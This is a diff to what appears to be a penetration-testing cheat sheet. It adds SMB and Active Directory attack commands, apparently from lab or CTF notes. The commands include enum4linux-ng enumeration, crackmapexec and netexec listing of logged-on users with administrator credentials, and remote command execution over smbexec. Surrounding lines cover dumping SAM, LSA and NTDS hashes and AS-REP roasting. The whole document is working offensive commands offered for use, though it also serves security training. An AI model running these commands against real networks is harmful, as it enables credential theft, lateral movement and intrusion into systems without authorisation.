@@ -765,14 +765,22 @@ https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
 ##### Attacking SMB
 
 ```
+(https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
+
 # Network share enumeration using smbmap.
 smbmap -H 10.129.14.128
 
 # Null-session with the rpcclient.
 rpcclient -U'%' 10.10.110.17
 
+# Automated enumeratition of the SMB service using enum4linux-ng. (https://github.com/cddmp/enum4linux-ng) 
+./enum4linux-ng.py 10.10.11.45 -A -C
+
 # Execute a command over the SMB service using crackmapexec.
 crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+
+# Enumerating Logged-on users.
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 
 # Extract hashes from the SAM database.
 crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
@@ -1229,6 +1237,9 @@ netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --pass-pol
 # Get description info 
 netexec ldap dc01.fluffy.htb -u '' -p '' --query "(description=*)" description
 
+# Enumerating Logged-on users.
+netexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+
 # AS-REP Roasting ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack ) 
 netexec ldap dc01.fluffy.htb -u '' -p '' --asreproast output.txt
 
@@ -1280,6 +1291,8 @@ netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 # Uses netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.( need priv DOMAIN ADMIN to dump NTDS.dit) 
 netexec smb <ip> -u <username> -p <password> --ntds
 
+# Execute a command over the SMB service using netexec.
+netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
 
 ```
 ## certipy
